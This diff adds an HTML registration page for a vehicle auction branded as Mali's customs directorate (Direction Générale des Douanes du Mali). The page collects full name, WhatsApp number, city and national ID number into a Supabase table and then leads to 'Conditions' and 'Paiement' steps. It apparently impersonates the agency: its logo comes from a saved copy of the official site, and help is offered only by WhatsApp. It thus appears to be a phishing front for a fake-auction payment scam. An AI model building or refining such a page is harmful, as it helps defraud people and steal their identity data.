@@ -1,0 +1,217 @@
+<!DOCTYPE html>
+<html lang="fr">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="Inscription - Enchères Douanes Mali">
+    <title>Inscription | Enchères Douanes Mali</title>
+
+    <!-- Fonts -->
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600;700&display=swap" rel="stylesheet">
+
+    <!-- Font Awesome -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+
+    <!-- Supabase -->
+    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+
+    <!-- Custom Styles -->
+    <link rel="stylesheet" href="css/style.css">
+</head>
+
+<body>
+    <!-- Header -->
+    <header class="header">
+        <div class="header-main">
+            <div class="container">
+                <div class="header-inner">
+                    <div class="logo">
+                        <a href="index.html">
+                            <img src="Accueil _ Douanes_files/Douanes-Logo_1.gif" alt="Logo Douanes Mali">
+                        </a>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </header>
+
+    <!-- Main Content -->
+    <main class="main-content">
+        <div class="container">
+
+            <div class="steps-container">
+                <div class="step active">
+                    <div class="step-circle">1</div>
+                    <span>Inscription</span>
+                </div>
+                <div class="step-line"></div>
+                <div class="step">
+                    <div class="step-circle">2</div>
+                    <span>Conditions</span>
+                </div>
+                <div class="step-line"></div>
+                <div class="step">
+                    <div class="step-circle">3</div>
+                    <span>Paiement</span>
+                </div>
+            </div>
+
+            <style>
+                /* Loader */
+                .loader-overlay {
+                    position: fixed;
+                    top: 0;
+                    left: 0;
+                    width: 100%;
+                    height: 100%;
+                    background: rgba(255, 255, 255, 0.8);
+                    display: none;
+                    justify-content: center;
+                    align-items: center;
+                    z-index: 9999;
+                    flex-direction: column;
+                }
+
+                .spinner {
+                    border: 5px solid #f3f3f3;
+                    border-top: 5px solid #2196f3;
+                    /* Blue Spinner */
+                    border-radius: 50%;
+                    width: 50px;
+                    height: 50px;
+                    animation: spin 1s linear infinite;
+                    margin-bottom: 15px;
+                }
+
+                @keyframes spin {
+                    0% {
+                        transform: rotate(0deg);
+                    }
+
+                    100% {
+                        transform: rotate(360deg);
+                    }
+                }
+            </style>
+
+            <!-- Loader Element -->
+            <div id="loader" class="loader-overlay">
+                <div class="spinner"></div>
+                <div style="color: #2196f3; font-weight: 600;">Enregistrement en cours...</div>
+            </div>
+
+            <div class="form-container">
+                <h2 style="text-align: center; margin-bottom: 30px; color: var(--color-primary);">Formulaire
+                    d'Inscription</h2>
+
+                <form id="registrationForm" onsubmit="submitRegistration(event)">
+                    <div class="form-group">
+                        <label class="form-label">Nom Complet *</label>
+                        <input type="text" id="fullName" class="form-control" required placeholder="Ex: Moussa Diarra">
+                    </div>
+
+                    <div class="form-group">
+                        <label class="form-label">Numéro de Téléphone (WhatsApp) *</label>
+                        <input type="tel" id="phone" class="form-control" required placeholder="Ex: +223 00 00 00 00">
+                    </div>
+
+                    <div class="form-group">
+                        <label class="form-label">Ville de Résidence *</label>
+                        <select id="city" class="form-control">
+                            <option>Bamako</option>
+                            <option>Sikasso</option>
+                            <option>Mopti</option>
+                            <option>Ségou</option>
+                            <option>Kayes</option>
+                            <option>Koulikoro</option>
+                            <option>Gao</option>
+                            <option>Tombouctou</option>
+                            <option>Kidal</option>
+                            <option>Autre</option>
+                        </select>
+                    </div>
+
+                    <div class="form-group">
+                        <label class="form-label">Numéro NINA / CNI / Passeport *</label>
+                        <input type="text" id="nina" class="form-control" placeholder="Numéro d'identification"
+                            required>
+                    </div>
+
+                    <button type="submit" class="btn-primary" style="width: 100%; margin-top: 20px;">Continuer vers les
+                        Conditions</button>
+                </form>
+
+                <div style="text-align: center; margin-top: 20px; font-size: 14px;">
+                    <span style="color: var(--color-gray);">Besoin d'aide ?</span>
+                    <a href="https://wa.me/22300000000" style="color: var(--color-primary); font-weight: 600;">Contacter
+                        un Agent</a>
+                </div>
+            </div>
+
+            <script src="js/supabase-config.js"></script>
+            <script>
+                async function submitRegistration(e) {
+                    e.preventDefault();
+
+                    const loader = document.getElementById('loader');
+                    loader.style.display = 'flex';
+
+                    // Get form data
+                    const urlParams = new URLSearchParams(window.location.search);
+                    const data = {
+                        full_name: document.getElementById('fullName').value,
+                        phone: document.getElementById('phone').value,
+                        city: document.getElementById('city').value,
+                        nina_number: document.getElementById('nina').value,
+                        vehicle_id: parseInt(urlParams.get('vehicle')) || null,
+                        vehicle_name: urlParams.get('name') || null
+                    };
+
+                    try {
+                        // Insert into Supabase
+                        const { data: result, error } = await supabase
+                            .from('users')
+                            .insert([data]);
+
+                        if (error) throw error;
+
+                        // Simulate delay for UX
+                        await new Promise(r => setTimeout(r, 1000));
+
+                        // Redirect to next step
+                        window.location.href = 'conditions.html' + window.location.search;
+                    } catch (error) {
+                        console.error('Error:', error);
+                        alert('Erreur lors de l\'inscription: ' + error.message);
+                    } finally {
+                        loader.style.display = 'none';
+                    }
+                }
+            </script>
+
+        </div>
+    </main>
+
+    <!-- Footer -->
+    <footer class="footer">
+        <div class="container">
+            <div class="footer-content">
+                <div class="footer-info">
+                    <h4>Heure de travail</h4>
+                    <p><strong>Lundi-Jeudi:</strong> 8h30 à 12h30</p>
+                    <p><strong>Vendredi:</strong> 8h à 12h</p>
+                    <p><strong>Sunday:</strong> Fermé</p>
+                </div>
+                <div class="footer-copyright">
+                    <p>&copy; 2024 Direction Générale des Douanes du Mali. Tous droits réservés.</p>
+                </div>
+            </div>
+        </div>
+    </footer>
+
+    <!-- Scripts -->
+    <script src="js/main.js"></script>
+</body>
+
+</html>
